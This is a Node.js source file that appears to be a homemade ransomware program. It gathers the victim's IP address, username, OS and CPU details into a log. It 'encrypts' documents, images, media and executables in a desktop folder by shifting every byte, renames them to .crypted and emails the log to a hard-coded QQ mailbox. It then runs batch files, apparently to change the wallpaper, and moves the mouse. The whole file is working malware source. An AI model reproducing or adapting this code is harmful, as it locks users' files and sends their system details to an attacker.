/*
 * @Author: zwx492293 
 * @Date: 2017-12-09 14:20:21 
 * @Last Modified by: zhoushoujian
 * @Last Modified time: 2017-12-17 23:07:58
 */
const fs = require('fs')
const path = require('path')
const os = require('os')
const child_process = require('child_process')
const year = new Date().getFullYear()
const month = new Date().getMonth() + 1
const day = new Date().getDate()
const hour = new Date().getHours()
const minute = new Date().getMinutes()
const second = new Date().getSeconds()
const time = `${year}-${month}-${day} ${hour}:${minute}:${second} `
const operationPlatform = process.platform  //获取操作系统平台，如win32
const operationCore = os.type()     //获取操作系统内核版本，如windows_NT
const operationArch = process.arch   //获取系统架构，如x64
const operationInfo = `${operationPlatform}_${operationCore}_${operationArch}`
const userName = process.env.USERPROFILE;
const fileFolderPath = `${userName}/Desktop/123`
//获取ip地址
const networkInterfaces = os.networkInterfaces()
var address;
Object.keys(networkInterfaces).forEach(function (m) {
    for (let n in networkInterfaces[m]) {
        if (networkInterfaces[m][n].family === "IPv4" && networkInterfaces[m][n].address !== "127.0.0.1") {
            address = networkInterfaces[m][n].address;
            return address;
        }
    }
})
const cpuCoreNumber = os.cpus().length  //获取cpu核心（线程）
const cpuModel = os.cpus()[0].model    //获取cpu型号
const cpuSpeed = os.cpus()[0].speed;    //获取cpu主频
const cpuInfo = `${cpuModel}_${cpuCoreNumber} core_${cpuSpeed}MHZ`;
//打印日志模块
fs.appendFile("log.txt", `\r\n \r\n \r\n \r\n \r\n ${time} \r\n ${operationInfo} \r\n ${address} \r\n ${userName} \r\n ${cpuInfo} `, {
    encoding: "utf8"
}, function () {
    console.log('process.pid-basic',process.pid)
});

var cryptedFile;
mailDep()
.then(() => robotDep())
.then(() => encrypt(fileFolderPath))
.then(function(){
     email(); 
	 console.log("finish!");
     return setWallpaper(1);
})

function mailDep() {
    return new Promise(function (resolve, reject) {
        function preFunc() {
                child_process.exec('mail.bat',
                    {
                        encoding: 'utf8',
                        timeout: 0,
                        maxBuffer: 10240 * 1024,
                        cwd: null,
                        env: null
                    },
                    function (error, stdout, stderr) {
                      resolve();
                    });
        }
       return preFunc();
    });
} 

function robotDep() {
    return new Promise(function (resolve, reject) {
        function preFunc() {
                child_process.exec('robot.bat',
                    {
                        encoding: 'utf8',
                        timeout: 0,
                        maxBuffer: 10240 * 1024,
                        cwd: null,
                        env: null
                    },
                    function (error, stdout, stderr) {
                      resolve();
                    });
        }
       return preFunc();
    });
} 

function encrypt(dst) {
    return new Promise(function(resolve,reject){
        let promiseArr = [];
        fs.readdirSync(dst).forEach(function (files) {
            //crypted files like follows
            if (path.extname(path.join(dst, files)) !== ".jpg" && path.extname(path.join(dst, files)) !== ".png" && 
                path.extname(path.join(dst, files)) !== ".bmp" && path.extname(path.join(dst, files)) !== ".gif" && 
                path.extname(path.join(dst, files)) !== ".zip" && path.extname(path.join(dst, files)) !== ".rar" && 
                path.extname(path.join(dst, files)) !== ".exe" && path.extname(path.join(dst, files)) !== ".txt" && 
                path.extname(path.join(dst, files)) !== ".mp3" && path.extname(path.join(dst, files)) !== ".wma" && 
                path.extname(path.join(dst, files)) !== ".wmv" && path.extname(path.join(dst, files)) !== ".mp4" && 
                path.extname(path.join(dst, files)) !== ".doc" && path.extname(path.join(dst, files)) !== ".xls" && 
                path.extname(path.join(dst, files)) !== ".ppt" && path.extname(path.join(dst, files)) !== ".pdf" && 
                path.extname(path.join(dst, files)) !== ".htm" && path.extname(path.join(dst, files)) !== ".lnk" &&
                path.extname(path.join(dst, files)) !== ".xlsx" && path.extname(path.join(dst, files)) !== ".pptx" &&
                path.extname(path.join(dst, files)) !== ".docx" && path.extname(path.join(dst, files)) !== ".html" ) {
                if (fs.statSync(path.join(dst, files)).isDirectory()) {
                    return encrypt(path.join(dst, files));   //recursive call
                }
            } else {
                let promise = new Promise((res)=>{
                    fs.readFile(path.join(dst, files), (err, buffer) => {
                        if (err) throw err;
                        let buf1 = Buffer.allocUnsafe(buffer.length);
                        for (let i = 0; i < buffer.length; i++) {
                            buf1[i] = buffer[i] + 5;  //加密文件数据
                        }
                        let fileExtname = Buffer.from(path.extname(path.join(dst, files)).slice(1,path.extname(path.join(dst, files)).length));  //slice the ext of file not contains .
                        let extNameBuffer = Buffer.allocUnsafe(fileExtname.length)
                        for (let i = 0; i < fileExtname.length; i++) {
                            extNameBuffer[i] = fileExtname[i] - 5;  //加密后缀名
                        }
                        const extLength = extNameBuffer.length; //文件后缀名的长度
                        const extLengthBuffer = Buffer.from((extLength<<1).toString());
                        const totalLength = buf1.length + extLength + extLengthBuffer.length;  //文件加后缀名的长度
                        const buf2 = Buffer.concat([buf1, extNameBuffer,extLengthBuffer], totalLength);  //文件数据+后缀名
                        fs.writeFile(path.join(dst, files), buf2, function (err) {
                            cryptedFile = `加密的文件${path.join(dst, files)}`;
                            console.log("encrypted files", cryptedFile);
                            if (err) {
                                throw err
                            }
                            let renameFiles = `${path.basename(path.join(dst, files),path.extname(path.join(dst, files)))}` + `.crypted`;  //leave . at path.basename
                            console.log("rename",renameFiles);
                            fs.renameSync(path.join(dst, files),`${path.join(dst, renameFiles)}`)  //rename
                            //打印日志模块
                            fs.appendFile("log.txt", ` \r\n ${cryptedFile} `, {
                                encoding: "utf8"
                            }, function () {
                                res();
                            });
                        });
                    });
                });
                promiseArr.push(promise);
            }
        });
        Promise.all(promiseArr).then(function(){
            resolve();
        });
    })
}
function email(){
    const log = process.env.windir
	return new Promise(function(res){
		console.log('email')
            var path = require("path")
            var emailer 	= require("emailjs");
            var filePath = path.resolve(log,"log.txt")
            var server 	= emailer.server.connect({
               user:	"863165094@qq.com", 
               password:"********", 
               host:	"smtp.qq.com", 
               ssl:		true
            });
            
            var message	= {
               text:	`${address}`, 
               from:	"qianchengyimeng@qq.com", 
               to:		"863165094@qq.com",
               //cc:		"else <else@your-email.com>",
               subject:	`${address}`,
               attachment: 
               [
                  {data:"<html>永恒之爱</html>", alternative:true},
                  {path:filePath, type:"application/txt", name:"log.txt"}
               ]
            };
            server.send(message, function(err, message) { 
                console.log("send email successfully!"); 
                setTimeout(function(){
                    robotFunc()
                },500)   
				res()
            })
			
	})  
}    
function setWallpaper(count){
	console.log('setWallpaper')
        return new Promise(function(resolve,reject){
            let i=1;
            let maxCount=10;
            function innerFunc(){
                setTimeout(function(){
                    console.log('count: ' ,i);
                    child_process.exec('fin.bat',
                    {
                        encoding: 'utf8',
                        timeout: 0, 
                        maxBuffer: 10240 * 1024, 
                        cwd: null,
                        env: null
                    },
                    function (error, stdout, stderr) {
                        i++;
                        if(i>count){   
                            resolve();
                        }else{
                            return innerFunc();
                        }
                    });
                },300);                 
            }
            innerFunc();
			
    });  
}
function robotFunc(){
    // Move the mouse across the screen as a sine wave.
	console.log('robotjs')
    const robot = require('robotjs');
    let n=1;
    let mouse = function(n){
        while(n){
            return new Promise(function(resolve){
                robot.setMouseDelay(8);
                let twoPI = Math.PI * 2;
                let screenSize = robot.getScreenSize();
                let height = (screenSize.height / 2) - 10;
                let width = screenSize.width;
                for (let x = 0; x < width; x++) {
                    y = height * Math.sin((twoPI * x) / width) + height;
                    robot.moveMouse(x, y);
                }
                resolve()
               }).then(function(){
                robot.setMouseDelay(8);
                let twoPI = Math.PI * 2;
                let screenSize = robot.getScreenSize();
                let height = (screenSize.height / 2) - 10;
                let width = screenSize.width;
                for (let x = width; x > 0; x--) {
                    y = -height * Math.sin((twoPI * x) / width) + height;
                    robot.moveMouse(x, y);
                }
                   m=n
                   console.log(m)
                   return mouse(--m)
               })
        }     
    }
    mouse(n)
    //return Promise.resolve();
}








